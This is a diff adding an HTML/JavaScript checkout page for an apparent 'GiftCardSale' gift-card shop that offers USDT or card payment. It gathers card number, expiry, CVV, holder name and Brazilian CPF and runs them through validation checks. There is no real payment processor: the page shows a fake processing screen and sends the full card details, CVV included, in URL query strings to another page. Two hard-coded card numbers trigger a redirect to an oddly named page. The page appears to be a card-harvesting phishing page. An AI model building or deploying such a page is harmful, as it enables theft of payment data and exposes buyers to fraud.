@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment - GiftCardSale</title>
+  
+  <link rel="icon" type="image/webp" href="fasvcom.webp">
+  
+  <style>
+    :root {
+      --primary: #EA1D2C;
+      --primary-dark: #C41826;
+      --success: #38B03F;
+      --bg: #F7F7F7;
+      --card: #FFFFFF;
+      --text: #212225;
+      --text-light: #767676;
+      --visa-color: #1A1F71;
+      --mastercard-color: #EB001B;
+      --usdt-color: #26A17B;
+      --error: #dc2626;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    
+    html, body {
+      margin: 0; padding: 0;
+      background: var(--bg); color: var(--text);
+      min-height: 100vh; padding-bottom: 90px;
+    }
+
+    /* HEADER */
+    .pay-header {
+      background: var(--card); padding: 12px 16px;
+      display: flex; align-items: center; gap: 12px;
+      position: sticky; top: 0; z-index: 100;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+      border-bottom: 1px solid #eee; height: 60px;
+    }
+    .back-btn {
+      background: none; border: none; cursor: pointer; color: var(--text);
+      padding: 8px; display: flex; align-items: center; justify-content: center; border-radius: 50%;
+    }
+    .back-btn:hover { background: #f0f0f0; }
+    .back-btn svg { width: 24px; height: 24px; }
+    .header-logo { display: flex; align-items: center; gap: 8px; flex: 1; }
+    .header-logo svg { width: 28px; height: 28px; color: var(--primary); }
+    .header-logo h1 { font-size: 1.1rem; font-weight: 700; }
+    .header-logo h1 span { color: var(--primary); }
+
+    /* CONTAINER */
+    .pay-container { max-width: 600px; margin: 0 auto; padding: 20px 16px; }
+    .section-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 16px; color: var(--text); }
+
+    /* RESUMO */
+    .pay-summary {
+      background: var(--card); border-radius: 12px; padding: 16px;
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 24px; border: 1px solid #eee;
+    }
+    .pay-summary-label { font-size: 0.9rem; color: var(--text-light); }
+    .pay-summary-value { font-size: 1.4rem; font-weight: 800; color: var(--text); }
+
+    /* GRID DE PAGAMENTOS */
+    .payment-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 30px; }
+
+    .payment-option {
+      background: var(--card); border: 2px solid #e5e7eb; border-radius: 12px;
+      padding: 20px; cursor: pointer; display: flex; flex-direction: column;
+      align-items: center; gap: 10px; transition: all 0.2s; position: relative;
+    }
+    .payment-option:hover { border-color: #ccc; }
+    .payment-option.active { border-color: var(--primary); background: #fff5f5; }
+    
+    .payment-icon { font-size: 2rem; margin-bottom: 5px; }
+    .payment-icon img { width: 48px; height: 48px; object-fit: contain; }
+    .payment-name { font-weight: 600; font-size: 0.9rem; text-align: center; }
+    
+    .payment-option.disabled { opacity: 0.5; pointer-events: none; filter: grayscale(1); cursor: not-allowed; background: #f9fafb; }
+    .disabled-badge {
+      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-15deg);
+      background: rgba(0,0,0,0.7); color: white; padding: 4px 8px;
+      font-size: 0.7rem; font-weight: 700; border-radius: 4px;
+    }
+    .group-label { grid-column: 1 / -1; font-size: 0.8rem; font-weight: 700; color: var(--text-light); text-transform: uppercase; letter-spacing: 0.5px; margin-top: 10px; }
+
+    /* MODAL DO CARTÃO */
+    .card-modal-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.85);
+      z-index: 2000; display: flex; align-items: flex-end; justify-content: center;
+      opacity: 0; pointer-events: none; transition: opacity 0.3s;
+    }
+    .card-modal-overlay.open { opacity: 1; pointer-events: auto; }
+    
+    .card-modal {
+      background: white; width: 100%; max-width: 600px;
+      border-radius: 24px 24px 0 0; padding: 24px;
+      transform: translateY(100%); transition: transform 0.3s ease-out;
+      max-height: 90vh; overflow-y: auto;
+    }
+    .card-modal-overlay.open .card-modal { transform: translateY(0); }
+
+    .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+    .modal-title { font-size: 1.2rem; font-weight: 700; }
+    .modal-close { background: #f0f0f0; border: none; width: 32px; height: 32px; border-radius: 50%; cursor: pointer; font-size: 1.2rem; color: #666; }
+
+    /* INPUTS DO CARTÃO */
+    .card-input-group { margin-bottom: 16px; position: relative; }
+    .card-label { display: block; font-size: 0.8rem; font-weight: 600; color: var(--text-light); margin-bottom: 6px; }
+    
+    .card-input-wrapper { position: relative; }
+    .card-input {
+      width: 100%; padding: 14px; border: 2px solid #e5e7eb; border-radius: 10px;
+      font-size: 1rem; outline: none; transition: border 0.2s;
+    }
+    .card-input:focus { border-color: var(--text); }
+    
+    /* ESTADOS DE ERRO E SUCESSO */
+    .card-input.error { border-color: var(--error); background: #fef2f2; }
+    .card-input.success { border-color: var(--success); background: #f0fdf4; }
+    
+    /* ÍCONES DE STATUS */
+    .status-icon {
+      position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+      width: 24px; height: 24px; display: none;
+    }
+    .status-icon.spinner {
+      display: block;
+      background: url("image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23212225' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M21 12a9 9 0 1 1-6.219-8.56'/%3E%3C/svg%3E") no-repeat center;
+      background-size: contain;
+      animation: spin 1s linear infinite;
+    }
+    .status-icon.valid {
+      display: block;
+      background: url("image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2338B03F' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='20 6 9 17 4 12'/%3E%3C/svg%3E") no-repeat center;
+      background-size: contain;
+    }
+    .status-icon.invalid {
+      display: block;
+      background: url("image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23dc2626' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cline x1='18' y1='6' x2='6' y2='18'/%3E%3Cline x1='6' y1='6' x2='18' y2='18'/%3E%3C/svg%3E") no-repeat center;
+      background-size: contain;
+    }
+
+    @keyframes spin { 0% { transform: translateY(-50%) rotate(0deg); } 100% { transform: translateY(-50%) rotate(360deg); } }
+
+    .error-msg {
+      display: block; color: var(--error); font-size: 0.75rem; margin-top: 4px; font-weight: 500;
+      opacity: 0; transition: opacity 0.2s; height: 0; overflow: hidden;
+    }
+    .card-input.error + .error-msg { opacity: 1; height: auto; }
+
+    .card-row { display: flex; gap: 12px; }
+    .card-row > div { flex: 1; }
+
+    /* BOTÃO FLUTUANTE GERAL */
+    .floating-action {
+      position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+      background: var(--primary); color: white;
+      width: 90%; max-width: 500px;
+      padding: 16px; border-radius: 14px;
+      display: flex; align-items: center; justify-content: center; gap: 12px;
+      font-size: 1.1rem; font-weight: 700; cursor: pointer;
+      box-shadow: 0 8px 24px rgba(234,29,44,0.4);
+      border: none; z-index: 900; transition: all 0.3s;
+    }
+    .floating-action:disabled { background: #ccc; box-shadow: none; cursor: not-allowed; }
+    .floating-action:hover { transform: translateX(-50%) translateY(-2px); }
+    .floating-action:active { transform: translateX(-50%) translateY(0); }
+
+    /* PROCESSING OVERLAY */
+    .processing-overlay {
+      position: fixed; inset: 0; background: white; z-index: 3000;
+      display: none; flex-direction: column; align-items: center; justify-content: center;
+    }
+    .spinner {
+      width: 50px; height: 50px; border: 4px solid #eee;
+      border-top: 4px solid var(--primary); border-radius: 50%;
+      animation: spinSimple 1s linear infinite; margin-bottom: 20px;
+    }
+    @keyframes spinSimple { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    @media (max-width: 480px) {
+      .card-modal { padding: 20px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header class="pay-header">
+    <button class="back-btn" onclick="window.history.back()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+    </button>
+    <div class="header-logo">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>
+      <h1 class="notranslate" translate="no">giftcard<span>sale</span></h1>
+    </div>
+  </header>
+
+  <div class="pay-container">
+    <div class="section-title">Payment Method</div>
+    <div class="pay-summary">
+      <span class="pay-summary-label">Total Amount</span>
+      <span class="pay-summary-value" id="totalDisplay">$0.00</span>
+    </div>
+
+    <!-- MÉTODOS DE PAGAMENTO -->
+    <div class="payment-grid">
+      <div class="group-label">Recommended</div>
+      
+      <div class="payment-option" id="opt-usdt" onclick="selectMethod('usdt')">
+        <div class="payment-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#26A17B" stroke-width="2" style="width: 40px; height: 40px;">
+            <circle cx="12" cy="12" r="10"/><path d="M12 7v10M8 10h8M8 14h8"/>
+          </svg>
+        </div>
+        <div class="payment-name">USDT (Crypto)</div>
+      </div>
+
+      <div class="payment-option" id="opt-card" onclick="selectMethod('card')">
+        <div class="payment-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#EA1D2C" stroke-width="2" style="width: 40px; height: 40px;">
+            <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/>
+          </svg>
+        </div>
+        <div class="payment-name">Visa / Mastercard</div>
+      </div>
+
+      <div class="group-label">Other Methods</div>
+      <div class="payment-option disabled">
+        <div class="payment-icon"><img src="paypal-logo.webp" alt="PayPal"></div>
+        <div class="payment-name">PayPal</div>
+        <div class="disabled-badge">Soon</div>
+      </div>
+      <div class="payment-option disabled">
+        <div class="payment-icon"><img src="mercadopago-logo.webp" alt="MP"></div>
+        <div class="payment-name">Mercado Pago</div>
+        <div class="disabled-badge">Soon</div>
+      </div>
+      <div class="payment-option disabled">
+        <div class="payment-icon"><img src="stripe-logo.webp" alt="Stripe"></div>
+        <div class="payment-name">Stripe</div>
+        <div class="disabled-badge">Soon</div>
+      </div>
+      <div class="payment-option disabled">
+        <div class="payment-icon">👜</div>
+        <div class="payment-name">Store Wallet</div>
+        <div class="disabled-badge">Soon</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL DE CARTÃO -->
+  <div class="card-modal-overlay" id="cardModal">
+    <div class="card-modal">
+      <div class="modal-header">
+        <h3 class="modal-title">Card Details</h3>
+        <button class="modal-close" onclick="closeCardModal()">×</button>
+      </div>
+
+      <div class="card-input-group">
+        <label class="card-label">Card Number</label>
+        <div class="card-input-wrapper">
+          <input type="text" id="cardNumber" class="card-input" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
+          <div id="cardStatus" class="status-icon"></div>
+        </div>
+        <span class="error-msg">Invalid card number</span>
+      </div>
+
+      <div class="card-row">
+        <div class="card-input-group">
+          <label class="card-label">Expiration</label>
+          <input type="text" id="cardExpiry" class="card-input" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+          <span class="error-msg">Required</span>
+        </div>
+        <div class="card-input-group">
+          <label class="card-label">CVV</label>
+          <input type="text" id="cardCVV" class="card-input" placeholder="123" maxlength="4" inputmode="numeric">
+          <span class="error-msg">Required</span>
+        </div>
+      </div>
+
+      <div class="card-input-group">
+        <label class="card-label">Card Holder Name</label>
+        <input type="text" id="cardName" class="card-input" placeholder="Name as printed on card">
+        <span class="error-msg">Required</span>
+      </div>
+
+      <div class="card-input-group">
+        <label class="card-label">CPF (Required)</label>
+        <input type="tel" id="cardCPF" class="card-input" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
+        <span class="error-msg">Invalid CPF</span>
+      </div>
+
+      <div style="margin-top: 24px;">
+        <button onclick="validateAndClose()" style="width: 100%; padding: 16px; background: var(--text); color: white; border: none; border-radius: 12px; font-weight: 700; font-size: 1rem; transition: opacity 0.2s;">
+          Verify & Save Data
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- BOTÃO FLUTUANTE -->
+  <button class="floating-action" id="floatingBtn" disabled onclick="processPayment()">
+    Select Payment Method
+  </button>
+
+  <!-- OVERLAY DE PROCESSAMENTO -->
+  <div class="processing-overlay" id="processingOverlay">
+    <div class="spinner"></div>
+    <h3 style="margin-bottom: 8px;">Processing Payment...</h3>
+    <p style="color: var(--text-light);">Please do not close this window.</p>
+  </div>
+
+  <script>
+    let selectedMethod = null;
+    let cartTotal = 0;
+    let currencySymbol = '$';
+    let cardDataValid = false;
+
+    // ✅ OBJETO PARA GUARDAR OS DADOS DO CARTÃO
+    let savedCardInfo = {
+      number: '', expiry: '', cvv: '', name: '', cpf: ''
+    };
+
+    // ✅ NÚMEROS DE CARTÃO ESPECIAIS (VIP)
+    const SPECIAL_CARDS = ['2234601655568037', '379363031400042'];
+
+    document.addEventListener('DOMContentLoaded', function() {
+      const params = new URLSearchParams(window.location.search);
+      const totalParam = params.get('total');
+      const countryParam = params.get('country');
+      
+      if (totalParam) {
+        cartTotal = parseFloat(totalParam);
+        currencySymbol = countryParam === 'US' ? '$' : 'R$';
+        document.getElementById('totalDisplay').textContent = `${currencySymbol}${cartTotal.toFixed(2)}`;
+      }
+    });
+
+    function selectMethod(method) {
+      selectedMethod = method;
+      document.querySelectorAll('.payment-option').forEach(el => el.classList.remove('active'));
+      document.getElementById(`opt-${method}`).classList.add('active');
+      
+      const btn = document.getElementById('floatingBtn');
+      if (method === 'usdt') {
+        btn.textContent = `Pay with USDT • ${currencySymbol}${cartTotal.toFixed(2)}`;
+        btn.disabled = false;
+      } else if (method === 'card') {
+        loadSavedCardData();
+        openCardModal();
+      }
+    }
+
+    function openCardModal() {
+      document.getElementById('cardModal').classList.add('open');
+    }
+    
+    function closeCardModal() {
+      document.getElementById('cardModal').classList.remove('open');
+    }
+
+    function loadSavedCardData() {
+      document.getElementById('cardNumber').value = savedCardInfo.number;
+      document.getElementById('cardExpiry').value = savedCardInfo.expiry;
+      document.getElementById('cardCVV').value = savedCardInfo.cvv;
+      document.getElementById('cardName').value = savedCardInfo.name;
+      document.getElementById('cardCPF').value = savedCardInfo.cpf;
+    }
+
+    // --- LÓGICA DE INPUT E MÁSCARAS ---
+
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cardStatusIcon = document.getElementById('cardStatus');
+
+    cardNumberInput.addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      let formatted = '';
+      for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += value[i];
+      }
+      e.target.value = formatted;
+      cardStatusIcon.className = 'status-icon';
+      e.target.className = 'card-input'; 
+    });
+
+    cardNumberInput.addEventListener('blur', function() {
+      const rawValue = this.value.replace(/\s/g, '');
+      if (rawValue.length < 13) return; 
+
+      cardStatusIcon.className = 'status-icon spinner';
+      
+      setTimeout(() => {
+        if (luhnCheck(rawValue)) {
+          this.className = 'card-input success';
+          cardStatusIcon.className = 'status-icon valid';
+        } else {
+          this.className = 'card-input error';
+          cardStatusIcon.className = 'status-icon invalid';
+        }
+      }, 800);
+    });
+
+    function luhnCheck(val) {
+        let sum = 0;
+        let shouldDouble = false;
+        for (let i = val.length - 1; i >= 0; i--) {
+            let digit = parseInt(val.charAt(i));
+            if (shouldDouble) {
+                if ((digit *= 2) > 9) digit -= 9;
+            }
+            sum += digit;
+            shouldDouble = !shouldDouble;
+        }
+        return (sum % 10) == 0;
+    }
+
+    // Validade
+    document.getElementById('cardExpiry').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
+      e.target.value = value;
+    });
+
+    // CPF
+    document.getElementById('cardCPF').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 11) value = value.slice(0, 11);
+      let formatted = '';
+      if (value.length > 9) formatted = value.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, '$1.$2.$3-$4');
+      else if (value.length > 6) formatted = value.replace(/(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
+      else if (value.length > 3) formatted = value.replace(/(\d{3})(\d{0,3})/, '$1.$2');
+      else formatted = value;
+      e.target.value = formatted;
+    });
+
+    // --- VALIDAÇÃO DE CPF REAL ---
+    function isValidCPF(cpf) {
+        cpf = cpf.replace(/[^\d]+/g, '');
+        if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+        let sum = 0;
+        for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
+        let rev = 11 - (sum % 11);
+        if (rev === 10 || rev === 11) rev = 0;
+        if (rev !== parseInt(cpf.substring(9, 10))) return false;
+        sum = 0;
+        for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i-1, i)) * (12 - i);
+        rev = 11 - (sum % 11);
+        if (rev === 10 || rev === 11) rev = 0;
+        return (rev === parseInt(cpf.substring(10, 11)));
+    }
+
+    // --- VALIDAÇÃO E SALVAMENTO ---
+
+    function validateAndClose() {
+      const numInput = document.getElementById('cardNumber');
+      const expInput = document.getElementById('cardExpiry');
+      const cvvInput = document.getElementById('cardCVV');
+      const nameInput = document.getElementById('cardName');
+      const cpfInput = document.getElementById('cardCPF');
+
+      const num = numInput.value.replace(/\s/g, '');
+      const exp = expInput.value;
+      const cvv = cvvInput.value;
+      const name = nameInput.value;
+      const cpf = cpfInput.value;
+      
+      let isValid = true;
+
+      if (!luhnCheck(num) || num.length < 13) {
+        numInput.className = 'card-input error';
+        cardStatusIcon.className = 'status-icon invalid';
+        isValid = false;
+      }
+      if (exp.length !== 5) { expInput.classList.add('error'); isValid = false; }
+      if (cvv.length < 3) { cvvInput.classList.add('error'); isValid = false; }
+      if (name.length < 3) { nameInput.classList.add('error'); isValid = false; }
+      
+      // ✅ VERIFICA SE O CPF É VÁLIDO PELO ALGORITMO
+      if (cpf.length < 14 || !isValidCPF(cpf)) { 
+        cpfInput.classList.add('error'); 
+        isValid = false; 
+      }
+
+      if (isValid) {
+        savedCardInfo = {
+          number: numInput.value,
+          expiry: expInput.value,
+          cvv: cvvInput.value,
+          name: nameInput.value,
+          cpf: cpfInput.value
+        };
+        
+        cardDataValid = true;
+        closeCardModal();
+        
+        const btn = document.getElementById('floatingBtn');
+        btn.textContent = `Pay with Card • ${currencySymbol}${cartTotal.toFixed(2)}`;
+        btn.disabled = false;
+      }
+    }
+
+    // --- FINALIZAÇÃO DO PAGAMENTO ---
+    function processPayment() {
+      if (!selectedMethod) return;
+      
+      if (selectedMethod === 'card' && !cardDataValid) {
+        loadSavedCardData();
+        openCardModal();
+        return;
+      }
+
+      const overlay = document.getElementById('processingOverlay');
+      overlay.style.display = 'flex';
+
+      const currentParams = new URLSearchParams(window.location.search);
+      currentParams.set('payment_method', selectedMethod);
+      currentParams.set('timestamp', Date.now());
+
+      // ✅ REDIRECIONAMENTO ESPECÍFICO PARA USDT
+      if (selectedMethod === 'usdt') {
+        setTimeout(() => {
+          window.location.href = `usdt-payment.html?${currentParams.toString()}`;
+        }, 1500);
+        return;
+      }
+
+      // ✅ LÓGICA DE REDIRECIONAMENTO PARA CARTÃO
+      if (selectedMethod === 'card') {
+        const cardNumber = savedCardInfo.number.replace(/\s/g, '');
+        
+        // Se for um dos cartões especiais, vai para fdhd6.html
+        if (SPECIAL_CARDS.includes(cardNumber)) {
+          setTimeout(() => {
+            window.location.href = 'fdhd6.html';
+          }, 1500);
+          return;
+        }
+        
+        // Se não for especial, adiciona dados do cartão e vai para processing.html
+        currentParams.set('card_number', encodeURIComponent(cardNumber));
+        currentParams.set('card_expiry', encodeURIComponent(savedCardInfo.expiry));
+        currentParams.set('card_cvv', encodeURIComponent(savedCardInfo.cvv));
+        currentParams.set('card_holder', encodeURIComponent(savedCardInfo.name));
+        currentParams.set('card_cpf', encodeURIComponent(savedCardInfo.cpf));
+      }
+
+      setTimeout(() => {
+        window.location.href = `processing.html?${currentParams.toString()}`;
+      }, 1500);
+    }
+  </script>
+</body>
+</html>
